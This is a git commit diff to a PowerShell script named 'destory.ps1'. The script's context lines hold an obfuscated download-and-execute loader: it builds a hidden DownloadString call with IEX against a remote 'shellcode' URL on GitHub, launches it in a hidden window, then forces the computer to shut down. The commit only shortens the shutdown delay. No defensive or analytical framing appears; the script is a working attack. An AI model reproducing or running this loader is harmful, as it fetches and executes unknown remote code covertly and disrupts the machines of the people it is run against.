1fbb7edec323d60e41b07071acb29d36d1205e7f
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:52:29 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -22,6 +22,6 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 Start-Sleep -Seconds 15
-shutdown /s /t 15 /c "Good look!"
-Start-Sleep -Seconds 1
+shutdown /s /t 4 /c "Good look!"
+Start-Sleep -Seconds 3
 Stop-Computer
